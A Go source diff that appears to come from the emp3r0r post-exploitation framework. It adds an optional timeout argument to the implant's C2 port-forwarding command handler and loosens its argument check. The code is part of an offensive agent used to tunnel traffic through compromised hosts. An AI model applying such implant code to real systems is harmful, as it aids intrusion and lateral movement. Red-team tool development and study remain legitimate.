@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 
@@ -121,7 +122,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		// port fwd
 		// cmd format: !port_fwd [to/listen] [shID] [operation]
 	case emp3r0r_data.C2CmdPortFwd:
-		if len(cmdSlice) != 4 {
+		if len(cmdSlice) < 4 {
 			out = fmt.Sprintf("Invalid command: %v", cmdSlice)
 			return
 		}
@@ -140,7 +141,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			go func() {
 				addr := cmdSlice[1]
 				sessionID := cmdSlice[2]
-				err = PortFwd(addr, sessionID, "tcp", true)
+				err = PortFwd(addr, sessionID, "tcp", true, 0)
 				if err != nil {
 					out = fmt.Sprintf("PortFwd (reverse) failed: %v", err)
 				}
@@ -149,7 +150,13 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			go func() {
 				to := cmdSlice[1]
 				sessionID := cmdSlice[2]
-				err = PortFwd(to, sessionID, cmdSlice[3], false)
+				protocol := cmdSlice[3]
+				timeout := 0
+				if len(cmdSlice) == 5 {
+					timeout, _ = strconv.Atoi(cmdSlice[4])
+				}
+
+				err = PortFwd(to, sessionID, protocol, false, timeout)
 				if err != nil {
 					out = fmt.Sprintf("PortFwd failed: %v", err)
 				}
